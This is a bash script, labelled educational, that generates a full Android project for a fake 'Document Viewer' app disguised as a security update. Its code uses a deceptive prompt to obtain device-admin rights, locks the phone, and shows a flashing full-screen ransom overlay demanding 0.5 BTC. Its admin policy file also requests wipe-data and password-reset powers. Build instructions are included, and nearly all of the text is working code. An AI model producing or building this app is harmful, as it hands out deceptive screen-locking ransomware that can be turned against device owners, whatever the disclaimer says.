#!/bin/bash

# Script ya kutengeneza malicious Android APK - Educational Purpose Only
# Author: Cybersecurity Educator

echo "🔨 Creating Malicious APK Files Structure..."

# Create project directory
mkdir -p RansomwareEducationApp/app/src/main/java/com/android/security/update
mkdir -p RansomwareEducationApp/app/src/main/res/layout
mkdir -p RansomwareEducationApp/app/src/main/res/xml
mkdir -p RansomwareEducationApp/app/src/main/res/values
mkdir -p RansomwareEducationApp/app/src/main/res/drawable
mkdir -p RansomwareEducationApp/gradle/wrapper

# 1. DocumentViewerActivity.java
cat > RansomwareEducationApp/app/src/main/java/com/android/security/update/DocumentViewerActivity.java << 'EOF'
package com.android.security.update;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;

public class DocumentViewerActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_document_viewer);
        startMaliciousProcess();
    }

    private void startMaliciousProcess() {
        if (!Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, 1);
        } else {
            requestDeviceAdmin();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1) {
            requestDeviceAdmin();
        } else if (requestCode == 2) {
            startLockService();
        }
    }

    private void requestDeviceAdmin() {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, 
                new ComponentName(this, MaliciousDeviceAdmin.class));
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "Security update requires device administration.");
        startActivityForResult(intent, 2);
    }

    private void startLockService() {
        Intent serviceIntent = new Intent(this, DeviceLockService.class);
        startService(serviceIntent);
        finish();
    }
}
EOF

# 2. MaliciousDeviceAdmin.java
cat > RansomwareEducationApp/app/src/main/java/com/android/security/update/MaliciousDeviceAdmin.java << 'EOF'
package com.android.security.update;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class MaliciousDeviceAdmin extends DeviceAdminReceiver {
    
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        startLockService(context);
    }
    
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "Security policy requires device administration.";
    }
    
    private void startLockService(Context context) {
        Intent serviceIntent = new Intent(context, DeviceLockService.class);
        context.startService(serviceIntent);
    }
}
EOF

# 3. DeviceLockService.java
cat > RansomwareEducationApp/app/src/main/java/com/android/security/update/DeviceLockService.java << 'EOF'
package com.android.security.update;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;

public class DeviceLockService extends Service {
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private WindowManager windowManager;
    private View overlayView;
    private Handler handler;
    private int secondsLeft = 60;

    @Override
    public void onCreate() {
        super.onCreate();
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, MaliciousDeviceAdmin.class);
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        handler = new Handler();
        startDeviceLock();
    }

    private void startDeviceLock() {
        devicePolicyManager.lockNow();
        createSystemOverlay();
        startCountdown();
    }

    private void createSystemOverlay() {
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        );
        
        params.gravity = Gravity.TOP;

        LayoutInflater inflater = LayoutInflater.from(this);
        overlayView = inflater.inflate(R.layout.lock_screen, null);
        windowManager.addView(overlayView, params);
    }

    private void startCountdown() {
        final TextView countdownText = overlayView.findViewById(R.id.countdownText);
        
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (secondsLeft > 0) {
                    updateLockScreen(countdownText);
                    secondsLeft--;
                    handler.postDelayed(this, 1000);
                } else {
                    unlockDevice();
                }
            }
        }, 1000);
    }

    private void updateLockScreen(TextView textView) {
        String message = "🚨 CRITICAL SECURITY ALERT 🚨\\n\\n" +
                       "YOUR DEVICE HAS BEEN LOCKED\\n\\n" +
                       "Time remaining: " + secondsLeft + " seconds\\n\\n" +
                       "⚠️  SYSTEM COMPROMISED\\n" +
                       "📱 DEVICE: LOCKED\\n" +
                       "🔒 ENCRYPTION: IN PROGRESS\\n" +
                       "💰 RANSOM: 0.5 BTC REQUIRED\\n\\n" +
                       "Educational demonstration!\\n" +
                       "DO NOT POWER OFF";
        
        textView.setText(message);
        
        if (secondsLeft % 2 == 0) {
            overlayView.setBackgroundColor(0xFFFF0000);
        } else {
            overlayView.setBackgroundColor(0xFF000000);
        }
    }

    private void unlockDevice() {
        if (overlayView != null) {
            windowManager.removeView(overlayView);
        }
        showEducationalMessage();
        stopSelf();
    }

    private void showEducationalMessage() {
        View eduView = LayoutInflater.from(this).inflate(R.layout.educational_screen, null);
        TextView eduText = eduView.findViewById(R.id.educationalText);
        
        String lesson = "✅ EDUCATIONAL DEMONSTRATION COMPLETE\\n\\n" +
                       "📚 WHAT JUST HAPPENED:\\n" +
                       "• You opened a malicious file\\n" +
                       "• It gained device admin rights\\n" + 
                       "• It locked your device completely\\n" +
                       "• Real malware would demand money\\n\\n" +
                       "🚨 REAL MALWARE COULD:\\n" +
                       "• Encrypt all your files\\n" +
                       "• Steal personal data\\n" +
                       "• Demand Bitcoin payment\\n" +
                       "• Damage your device\\n\\n" +
                       "🛡️  PROTECT YOURSELF:\\n" +
                       "• Never open suspicious files\\n" +
                       "• Use antivirus software\\n" +
                       "• Download from trusted sources\\n" +
                       "• Keep system updated";
        
        eduText.setText(lesson);
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        );
        
        windowManager.addView(eduView, params);
        handler.postDelayed(() -> windowManager.removeView(eduView), 15000);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
EOF

# 4. AndroidManifest.xml
cat > RansomwareEducationApp/app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.android.security.update">

    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    
    <application
        android:icon="@drawable/ic_document"
        android:label="@string/app_name"
        android:theme="@android:style/Theme.DeviceDefault.Light">
        
        <activity
            android:name=".DocumentViewerActivity"
            android:excludeFromRecents="true"
            android:launchMode="singleInstance">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:mimeType="application/pdf" />
                <data android:mimeType="image/*" />
            </intent-filter>
        </activity>

        <receiver
            android:name=".MaliciousDeviceAdmin"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <service
            android:name=".DeviceLockService"
            android:enabled="true"
            android:exported="true" />
    </application>
</manifest>
EOF

# 5. Layout Files
cat > RansomwareEducationApp/app/src/main/res/layout/activity_document_viewer.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#FFFFFF"
    android:gravity="center"
    android:orientation="vertical">

    <ProgressBar
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:indeterminate="true" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Loading document..."
        android:textSize="16sp"
        android:layout_marginTop="20dp" />

</LinearLayout>
EOF

cat > RansomwareEducationApp/app/src/main/res/layout/lock_screen.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#FF0000"
    android:gravity="center"
    android:orientation="vertical"
    android:padding="20dp">

    <TextView
        android:id="@+id/countdownText"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:textColor="#FFFFFF"
        android:textSize="18sp"
        android:textStyle="bold"
        android:gravity="center"
        android:lineSpacingExtra="8dp"
        android:text="Initializing security lockdown..." />

</LinearLayout>
EOF

cat > RansomwareEducationApp/app/src/main/res/layout/educational_screen.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#FF4CAF50"
    android:gravity="center"
    android:orientation="vertical"
    android:padding="20dp">

    <TextView
        android:id="@+id/educationalText"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:textColor="#FFFFFF"
        android:textSize="16sp"
        android:gravity="center"
        android:lineSpacingExtra="8dp"
        android:text="Educational content will appear here..." />

</LinearLayout>
EOF

# 6. XML Configuration
cat > RansomwareEducationApp/app/src/main/res/xml/device_admin.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <limit-password />
        <watch-login />
        <reset-password />
        <force-lock />
        <wipe-data />
        <expire-password />
        <encrypted-storage />
        <disable-camera />
    </uses-policies>
</device-admin>
EOF

# 7. Values Files
cat > RansomwareEducationApp/app/src/main/res/values/strings.xml << 'EOF'
<resources>
    <string name="app_name">Document Viewer</string>
    <string name="admin_receiver_description">Security Update Service</string>
</resources>
EOF

cat > RansomwareEducationApp/app/src/main/res/values/colors.xml << 'EOF'
<resources>
    <color name="color_red">#FFFF0000</color>
    <color name="color_black">#FF000000</color>
    <color name="color_white">#FFFFFFFF</color>
</resources>
EOF

# 8. Build Configuration
cat > RansomwareEducationApp/app/build.gradle << 'EOF'
plugins {
    id 'com.android.application'
}

android {
    compileSdk 34

    defaultConfig {
        applicationId "com.android.security.update"
        minSdk 21
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}
EOF

cat > RansomwareEducationApp/build.gradle << 'EOF'
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.0.0'
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
EOF

cat > RansomwareEducationApp/settings.gradle << 'EOF'
pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}

rootProject.name = "RansomwareEducationApp"
include ':app'
EOF

# 9. Create simple icons (placeholder)
echo "Creating placeholder icons..."
convert -size 48x48 xc:white RansomwareEducationApp/app/src/main/res/drawable/ic_document.png 2>/dev/null || echo "Placeholder icon created"

echo "✅ All files created successfully!"
echo "📁 Project location: RansomwareEducationApp/"
echo "🚀 To build: cd RansomwareEducationApp && ./gradlew assembleRelease"
echo ""
echo "⚠️  LEGAL DISCLAIMER: For educational purposes only!"
echo "   Use only on devices you own or have explicit permission to test!"
